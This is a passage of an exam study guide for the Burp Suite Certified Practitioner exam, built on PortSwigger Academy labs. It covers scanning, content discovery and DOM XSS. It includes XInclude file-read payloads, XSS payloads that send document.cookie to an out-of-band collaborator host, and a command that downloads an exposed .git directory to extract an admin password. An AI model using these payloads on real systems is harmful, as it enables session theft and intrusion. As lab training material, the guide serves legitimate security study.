0-1.5ZM2 14a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm1-6a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM2 4a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg></button></div><div class="Box-sc-62in7e-0 js-snippet-clipboard-copy-unpositioned DirectoryRichtextContent-module__SharedMarkdownContent--BTKsc" data-hpc="true"><article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Burp Suite Certified Practitioner Exam Study</h1><a id="user-content-burp-suite-certified-practitioner-exam-study" class="anchor" aria-label="Permalink: Burp Suite Certified Practitioner Exam Study" href="#burp-suite-certified-practitioner-exam-study"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">This is my study notes with over a 110 PortSwigger Academy Labs.
I used these labs to pass the <a href="https://portswigger.net/web-security/certification" rel="nofollow">Burp Suite Certified Practitioner</a> Exam 2023.
My <a href="https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8" rel="nofollow">BSCP qualification</a>.<br>
For more informaion go to <a href="https://portswigger.net/web-security/all-materials" rel="nofollow">PortSwigger Academy</a> to get latest learning materials.</p>
</blockquote>
<hr>
<p dir="auto"><strong><a href="#scanning">SCANNING</a> - Enumeration</strong><br>
<a href="#focus-scanning">Focus Scanning</a><br>
<a href="#scanning-non-standard-data-structures">Scan non-standard entities</a></p>
<p dir="auto"><strong><a href="#foothold">FOOTHOLD</a> - Stage 1</strong><br>
<a href="#content-discovery">Content Discovery</a><br>
<a href="#dom-based-xss">DOM-XSS</a><br>
<a href="#cross-site-scripting">XSS Cross Site Scripting</a><br>
<a href="#web-cache-poison">Web Cache Poison</a><br>
<a href="#host-headers">Host Headers</a><br>
<a href="#http-request-smuggling">HTTP Request Smuggling</a><br>
<a href="#brute-force">Brute force</a><br>
<a href="#authentication">Authentication</a></p>
<p dir="auto"><strong><a href="#privilege-escalation">PRIVILEGE ESCALATION</a> - Stage 2</strong><br>
<a href="#csrf-account-takeover">CSRF - Account Takeover</a><br>
<a href="#password-reset">Password Reset</a><br>
<a href="#sql-injection">SQLi - SQL Injection</a><br>
<a href="#jwt">JWT - JSON Web Tokens</a><br>
<a href="#prototype-pollution">Prototype pollution</a><br>
<a href="#api-testing">API Testing</a><br>
<a href="#access-control">Access Control</a><br>
<a href="#graphql-api">GraphQL API Endpoints</a><br>
<a href="#cors">CORS - Cross-origin resource sharing</a></p>
<p dir="auto"><strong><a href="#data-exfiltration">DATA EXFILTRATION</a> - Stage 3</strong><br>
<a href="#xxe-injections">XXE - XML entities &amp; Injections</a><br>
<a href="#ssrf---server-side-request-forgery">SSRF - Server side request forgery</a><br>
<a href="#ssti---server-side-template-injection">SSTI - Server side template injection</a><br>
<a href="#sspp---server-side-prototype-pollution">SSPP - Server Side Prototype Pollution</a><br>
<a href="#file-path-traversal">LFI - File path traversal</a><br>
<a href="#file-uploads">File Uploads</a><br>
<a href="#deserialization">Deserialization</a><br>
<a href="#os-command-injection">OS Command Injection</a></p>
<p dir="auto"><strong><a href="#appendix">APPENDIX</a></strong><br>
<a href="#python-scripts">Python Scripts</a><br>
<a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/README.md">Payloads</a><br>
<a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists">Word lists</a><br>
<a href="#focus-scanning">Focus target scanning</a><br>
<a href="#approach">Approach</a><br>
<a href="#extra-training-content">Extra Training Content</a></p>
<p dir="auto"><a href="#burp-exam-results">My Burp Tips</a></p>
<blockquote>
<p dir="auto">I can recommend doing as many as possible <a href="https://portswigger.net/web-security/mystery-lab-challenge" rel="nofollow">Mystery lab challenge</a> to test your skills and decrease the time it takes you to <em><strong>identify</strong></em> the vulnerabilities, before taking the exam.<br>
I also found this PortSwigger advice on <a href="https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC" rel="nofollow">Retaking your exam</a> very informative.<br>
Watch <a href="https://youtu.be/L-3jJTGLAhc?si=Mze8eY9mjaJl1PWR" rel="nofollow">CryptoCat - Burp Suite Certified Professional (BSCP) Review + Tips/Tricks</a> for fresh view of the BSCP exam in 2024.</p>
</blockquote>
<hr>
<p dir="auto"><br><br><a href="https://www.buymeacoffee.com/botesjuan" rel="nofollow"><img src="https://camo.githubusercontent.com/0cf29a542375e1a46e84d8bf5805a4e5c0a6ee98b6547ccdc0c55eed49d99c69/68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f76322f64656661756c742d79656c6c6f772e706e67" alt="Buy Me A Coffee" style="height: 60px !important; width: 217px !important; max-width: 100%;" data-canonical-src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png"></a></p>
<blockquote>
<p dir="auto">Thanks too all for your support by buying me <em><strong>coffee</strong></em>, thanks you so much <code>\o/</code></p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8?utm_source=office&amp;utm_medium=email&amp;utm_campaign=burp-prac-cert-pass-success" rel="nofollow">My Burp Suite Certified Practitioner certificate.</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Scanning</h1><a id="user-content-scanning" class="anchor" aria-label="Permalink: Scanning" href="#scanning"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Enumeration of the Web Applications start with initial and directed scanning in time limited engagement.</p>
</blockquote>
<p dir="auto"><a href="#focus-scanning">Focus Scanning</a><br>
<a href="#scanning-non-standard-data-structures">Scan non-standard entities</a></p>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Focus Scanning</h2><a id="user-content-focus-scanning" class="anchor" aria-label="Permalink: Focus Scanning" href="#focus-scanning"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Due to the tight time limit during engagements or exam, <a href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing" rel="nofollow">scan defined insertion points</a> for specific requests.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/scan-defined-insertion-points.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/scan-defined-insertion-points.png" alt="scan-defined-insertion-points" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Scanner detected <strong>XML injection</strong> vulnerability on storeId parameter and this lead to reading the secret Carlos file.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///home/carlos/secret&quot;/&gt;&lt;/foo&gt;"><pre>&lt;<span class="pl-ent">foo</span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">xi</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2001/XInclude<span class="pl-pds">"</span></span>&gt;&lt;<span class="pl-ent">xi</span><span class="pl-ent">:</span><span class="pl-ent">include</span> <span class="pl-e">parse</span>=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> <span class="pl-e">href</span>=<span class="pl-s"><span class="pl-pds">"</span>file:///home/carlos/secret<span class="pl-pds">"</span></span>/&gt;&lt;/<span class="pl-ent">foo</span>&gt;</pre></div>
<blockquote>
<p dir="auto">Out of band XInclude request, need hosted DTD to read local file.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;hqt xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://OASTIFY.COM/foo&quot;/&gt;&lt;/hqt&gt;"><pre>&lt;<span class="pl-ent">hqt</span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">xi</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2001/XInclude<span class="pl-pds">"</span></span>&gt;&lt;<span class="pl-ent">xi</span><span class="pl-ent">:</span><span class="pl-ent">include</span> <span class="pl-e">href</span>=<span class="pl-s"><span class="pl-pds">"</span>http://OASTIFY.COM/foo<span class="pl-pds">"</span></span>/&gt;&lt;/<span class="pl-ent">hqt</span>&gt;</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning" rel="nofollow">PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning</a></p>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Scanning non-standard data structures</h2><a id="user-content-scanning-non-standard-data-structures" class="anchor" aria-label="Permalink: Scanning non-standard data structures" href="#scanning-non-standard-data-structures"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Scanning non-standard data structures using Burp feature to scan selected insertion point for select text in response or requests.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/scan-selected-insertion-point.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/scan-selected-insertion-point.png" alt="scan-selected-insertion-point" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Identify the vulnerability through Burp scanner issue results.<br>
In this case, using the identified XSS, Steal the admin user's cookies by crafting the payload in the <em><strong>identified</strong></em> insertion point.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'&quot;&gt;&lt;svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)&gt;:CURRENT-USER-LOGIN-COOKIE-2ND-PART"><pre class="notranslate"><code>'"&gt;&lt;svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)&gt;:CURRENT-USER-LOGIN-COOKIE-2ND-PART
</code></pre></div>
<blockquote>
<p dir="auto">Url encode key characters.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-cookie-stealer1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-cookie-stealer1.png" alt="admin-cookie-stealer" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Use the admin user's cookie to access the admin panel by replacing it in the current browser session.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures" rel="nofollow">PortSwigger Lab: Scanning non-standard data structures</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Foothold</h1><a id="user-content-foothold" class="anchor" aria-label="Permalink: Foothold" href="#foothold"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Content Discovery</h1><a id="user-content-content-discovery" class="anchor" aria-label="Permalink: Content Discovery" href="#content-discovery"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Enumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use <code>FFUF</code> to enumerate web directories and files. Looking at <code>robots.txt</code> or <code>sitemap.xml</code> that can reveal content.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt

ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ"><pre>wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt

ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ</pre></div>
<blockquote>
<p dir="auto">Burp engagement tool, content discovery using my compiled word list <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt">burp-labs-wordlist</a> as custom file list.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/content-discovery.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/content-discovery.png" alt="content-discovery.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Examine the git repo branches on local downloaded copy, using <code>git-cola</code> tool. Then select <strong>Undo last commit</strong> and extract admin password from the diff window.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="wget -r https://TARGET.web-security-academy.net/.git/

git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/"><pre class="notranslate"><code>wget -r https://TARGET.web-security-academy.net/.git/

git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/git-cola.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/git-cola.png" alt="git-cola" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history" rel="nofollow">PortSwigger Lab: Information disclosure in version control history</a></p>
<blockquote>
<p dir="auto">Always open <code>source code</code> to look for any developer comments that reveal hidden files or paths. Below example lead to <a href="#deserialization">symphony token deserialization</a>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dev-code-debug-comment.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dev-code-debug-comment.png" alt="DEV code debug comment deserial" style="max-width: 100%;"></a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">DOM-Based XSS</h2><a id="user-content-dom-based-xss" class="anchor" aria-label="Permalink: DOM-Based XSS" href="#dom-based-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#identify-dom-xss">DOM XSS Indicators</a><br>
<a href="#dom-invader">DOM XSS Identified with DOM Invader</a><br>
<a href="#vuln-angularjs">DOM XSS AngularJS</a><br>
<a href="#doc-write-location-search">DOM XSS document.write in select</a><br>
<a href="#dom-xss-jsonparse-web-messages">DOM XSS JSON.parse web messages</a><br>
<a href="#dom-xss-addeventlistener-javascript-url">DOM XSS AddEventListener JavaScript URL</a><br>
<a href="#dom-xss-addeventlistener-ads-message">DOM XSS AddEventListener Ads Message</a><br>
<a href="#reflected-dom-xss">DOM XSS Eval Reflected Cookie Stealer</a><br>
<a href="#dom-xss-lastviewedproduct-cookie">DOM XSS LastviewedProduct Cookie</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identify DOM-XSS</h3><a id="user-content-identify-dom-xss" class="anchor" aria-label="Permalink: Identify DOM-XSS" href="#identify-dom-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution.
Test which characters enable the escaping out of the <code>source code</code> injection point, by using the fuzzer string below.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;&gt;\'\&quot;&lt;script&gt;{{7*7}}$(alert(1)}&quot;-prompt(69)-&quot;fuzzer"><pre class="notranslate"><code>&lt;&gt;\'\"&lt;script&gt;{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
</code></pre></div>
<blockquote>
<p dir="auto">Review the <code>source code</code> to <em><strong>identify</strong></em> the <strong>sources</strong> , <strong>sinks</strong> or <strong>methods</strong> that may lead to exploit, list of samples:</p>
</blockquote>
<ul dir="auto">
<li>document.write()</li>
<li>window.location</li>
<li>document.cookie</li>
<li>eval()</li>
<li>document.domain</li>
<li>WebSocket()</li>
<li>element.src</li>
<li>postMessage()</li>
<li>setRequestHeader()</li>
<li>FileReader.readAsText()</li>
<li>ExecuteSql()</li>
<li>sessionStorage.setItem()</li>
<li>document.evaluate()</li>
<li>JSON.parse</li>
<li>ng-app</li>
<li>URLSearchParams</li>
<li>replace()</li>
<li>innerHTML</li>
<li>location.search</li>
<li>addEventListener</li>
<li>sanitizeKey()</li>
</ul>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Dom Invader</h3><a id="user-content-dom-invader" class="anchor" aria-label="Permalink: Dom Invader" href="#dom-invader"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Using Dom Invader plug-in and set the canary to value, such as <code>domxss</code>, it will detect DOM-XSS sinks that can be exploit.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader.png" alt="DOM Invader" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Vulnerable AngularJS</h3><a id="user-content-vulnerable-angularjs" class="anchor" aria-label="Permalink: Vulnerable AngularJS" href="#vulnerable-angularjs"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is <em><strong>identified</strong></em> by noticing the search string is enclosed in an <strong>ng-app</strong> directive and <code>/js/angular 1-7-7.js</code> script included. Review the HTML code to <em><strong>identify</strong></em> the <code>ng-app</code> directive telling AngularJS that this is the root element of the AngularJS application.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ng-app-code-review.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ng-app-code-review.png" alt="domxss-on-constructor.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">PortSwigger lab payload below:</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{{$on.constructor('alert(1)')()}}"><pre><span class="pl-kos">{</span><span class="pl-kos">{</span><span class="pl-s1">$on</span><span class="pl-kos">.</span><span class="pl-en">constructor</span><span class="pl-kos">(</span><span class="pl-s">'alert(1)'</span><span class="pl-kos">)</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">}</span><span class="pl-kos">}</span></pre></div>
<blockquote>
<p dir="auto"><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md">Cookie stealer payload</a> using <code>on.constructor</code> that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.<br>
<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter)" rel="nofollow">PortSwigger cheat sheet for cross site scripting reference</a></p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{{$on.constructor('document.location=&quot;https://OASTIFY.COM?c=&quot;+document.cookie')()}}"><pre><span class="pl-kos">{</span><span class="pl-kos">{</span><span class="pl-s1">$on</span><span class="pl-kos">.</span><span class="pl-en">constructor</span><span class="pl-kos">(</span><span class="pl-s">'document.location="https://OASTIFY.COM?c="+document.cookie'</span><span class="pl-kos">)</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">}</span><span class="pl-kos">}</span></pre></div>
<blockquote>
<p dir="auto"><strong>Note:</strong> The session cookie property must not have the <strong>HttpOnly</strong> secure flag set in order for XSS to succeed.</p>
</blockquote>
